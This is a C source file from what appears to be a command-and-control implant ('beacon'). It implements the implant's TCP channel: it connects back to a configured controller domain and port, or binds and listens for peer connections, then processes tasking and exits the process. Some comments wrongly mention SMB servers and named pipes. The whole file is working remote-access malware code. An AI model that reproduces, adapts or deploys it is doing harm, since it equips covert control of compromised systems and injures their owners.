/* 
 * Manage the TCP channel
 */
#include "beacon.h"
#include "channel.h"
#include "commands.h"
#include "security.h"
#include "link.h"
#include "linkint.h"
#include "clientint.h"

static SOCKET server;

extern unsigned int post_type;
extern unsigned int sleep_time;

SOCKET wsconnect(char * targetip, int port);
SOCKET GargleAccept(SOCKET s);
void GargleWaitTCP(SOCKET s);

/* call our gargle function */
static void link_channel_tcp_wait(void * thisp) {
	LCHANNEL * inst = (LCHANNEL *)thisp;
	GargleWaitTCP(inst->socket);
}

/* create a new kind of channel */
LCHANNEL lchannel_tcp_gargle(SOCKET socket) {
	LCHANNEL channel;
	channel       = lchannel_tcp(socket);
	channel.wait  = link_channel_tcp_wait;
	return channel;
}

/* init our connection */
BOOL tcp_init() {
	/* set post type to POST_TCP now... since everything seems OK */
	post_type = POST_TCP;

	/* init our winsock socket */
	channel_winsock_init();

	/* connect! */
	server = wsconnect(setting_ptr(SETTING_DOMAINS), setting_short(SETTING_PORT));
	if (server == INVALID_SOCKET)
		return FALSE;

	/* initialize our client (IF we were successful) */
	client_init(lchannel_tcp_gargle(server));

	/* alright, this is good to go */
	return TRUE;
}

/* init our connection */
BOOL tcp_server_wait(int bindto) {
	SOCKET ServerSock = INVALID_SOCKET;
	struct sockaddr_in sock;
	unsigned int status = 0;

	/* set post type to POST_TCP now... since everything seems OK */
	post_type = POST_TCP;

	/* setup our socket */
	ServerSock = socket(AF_INET, SOCK_STREAM, 0);
	if (ServerSock == INVALID_SOCKET) {
		closesocket(ServerSock);
		return FALSE;
	}

	/* specify the host/port we want to bind to */
	sock.sin_family = AF_INET;
	sock.sin_port = htons(setting_short(SETTING_PORT));
	sock.sin_addr.s_addr = bindto;

	/* start our server */
	status = bind(ServerSock, (SOCKADDR*)&sock, sizeof(sock));
	if (status == SOCKET_ERROR) {
		closesocket(ServerSock);
		return FALSE;
	}

	/* listen for a connection... *pHEAR* */
	status = listen(ServerSock, 120);
	if (status == SOCKET_ERROR) {
		closesocket(ServerSock);
		return FALSE;
	}

	/* try to accept our connection */
	server = GargleAccept(ServerSock);

	if (server != INVALID_SOCKET) {
		/* initialize our connection, please */
		client_init(lchannel_tcp_gargle(server));
		closesocket(ServerSock);
		return TRUE;
	}
	else {
		closesocket(ServerSock);
		return FALSE;
	}
}

/*
 *  kill our named pipe (done)
 */
void tcp_stop() {
	/* do the right thing for our TCP socket */
	closesocket(server);

	/* free up some of our data */
	client_stop();
}

/*
 * put this beacon into a mode where it's waiting for a connection to its pipe
 */
void command_tcp_reverse_start() {
	/* setup our SMB server */
	if (!tcp_init()) {
		return;
	}

	/* process data */
	client_process();

	/* close down the client too */
	client_close();

	/* OK, time to shut it down */
	tcp_stop();

	/* just kill the process... it's this or crash */
	safe_exit();
}

/*
* put this beacon into a mode where it's waiting for a connection to its socket
*/
void command_tcp_bind_start() {
	/* our bind host, might be 127.0.0.1 when staging a bind_tcp Beacon locally */
	int bindto = htonl(setting_int(SETTING_BINDHOST));

	/* init winsock */
	channel_winsock_init();

	/* while we are an SMB server... do this stuff */
	while (sleep_time > 0) {
		/* wait for a connection and send our agent id */
		if (!tcp_server_wait(bindto))
			break;

		/* process data */
		client_process();

		/* kill the client */
		client_close();

		/* close the session */
		closesocket(server);
	}

	/* we're no longer an SMB server... stop the shenanigans */
	tcp_stop();

	/* just kill the process... it's this or crash */
	safe_exit();
}